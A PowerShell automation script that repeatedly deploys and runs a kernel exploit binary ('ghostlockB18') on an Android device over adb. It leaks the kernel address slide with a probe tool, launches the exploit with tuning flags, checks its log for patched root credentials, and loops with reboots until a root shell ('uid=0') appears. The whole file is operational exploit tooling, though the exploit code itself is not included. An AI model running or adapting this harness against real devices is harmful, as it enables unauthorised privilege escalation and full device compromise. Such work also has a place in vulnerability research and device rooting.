# Retry loop for hướng B / nhánh cred (B18). Safe: no bootloader/flash.
$adb = 'E:\Library\Desktop\platform-tools-latest-windows\platform-tools\adb.exe'
$bin = 'E:\Library\Desktop\ghostlock\ghostlockB18_a64'
$log = 'E:\Library\Desktop\ghostlock\_dn_e2e2.log'
function L($m){ $m | Out-File -FilePath $log -Append -Encoding utf8; Write-Output $m }
"=== e2e2 start $(Get-Date) ===" | Out-File -FilePath $log -Encoding utf8
$max = 8; $ok = $false
for ($att = 1; $att -le $max; $att++) {
  L ""; L "----- attempt $att / $max -----"
  & $adb wait-for-device *> $null
  for ($i=0; $i -lt 90; $i++){ $bc=(& $adb shell getprop sys.boot_completed 2>$null) -join ''; if ($bc.Trim() -eq '1'){break}; Start-Sleep 5 }
  L "settling 120s"; Start-Sleep -Seconds 120
  & $adb push $bin /data/local/tmp/ghostlockB18 *> $null
  & $adb shell "chmod 755 /data/local/tmp/ghostlockB18; cp -f /data/local/tmp/ghostlockB18 /data/local/tmp/a/e; chmod 755 /data/local/tmp/a/e; rm -f /data/local/tmp/.ghostlock_rootshell /data/local/tmp/.ghostlock_root.log" *> $null
  $sp = (& $adb shell "cd /data/local/tmp && timeout 40 ./slideprobe > sp2.log 2>&1; grep -a -m1 bd4 sp2.log" 2>$null) -join "`n"
  L "probe: $sp"
  if ($sp -match '([0-9a-f]{16})') { $low=$matches[1].Substring(8); $slide=[uint32]([Convert]::ToUInt32($low,16)) - 0x8000000 - 0x3bd4 }
  else { L "no slide; reboot"; & $adb reboot *> $null; Start-Sleep 20; continue }
  $sx = '0x{0:x}' -f $slide; L "slide=$sx"
  $cmd = "cd /data/local/tmp && rm -f gl2.log; nohup sh -c 'ONLY_FOPS=1 SKIP_UMH=1 FORCE_REDIRECT=1 SSOPT_EMPTY=1 SSOPT_FAKE_TASK=1 SSOPT_PEEK=1 SSOPT_HOLD=0 SSOPT_OWNER0=0 PSELECT_ROUTE_DELAY_USEC=0 ROUTE_SETSOCKOPT=1 SLIDE=$sx timeout 150 ./ghostlockB18 > gl2.log 2>&1' >/dev/null 2>&1 & echo STARTED"
  & $adb shell $cmd *> $null
  Start-Sleep -Seconds 90
  $r = (& $adb shell "grep -a -e 'root child result' -e 'root cred patched' -e 'root self' -e 'root bad' -e 'cfi FAIL' /data/local/tmp/gl2.log 2>/dev/null | tail -6" 2>$null) -join ' || '
  L "result: $r"
  $rs = (& $adb shell "cat /data/local/tmp/.ghostlock_rootshell 2>/dev/null" 2>$null) -join ''
  L "rootshell: $rs"
  if ($rs -match 'uid=0') { L "*** ROOT SHELL UP on attempt $att ***"; $ok = $true; break }
  L "no root shell; rebooting"
  & $adb reboot *> $null; Start-Sleep -Seconds 25
}
L "=== e2e2 done ok=$ok $(Get-Date) ==="
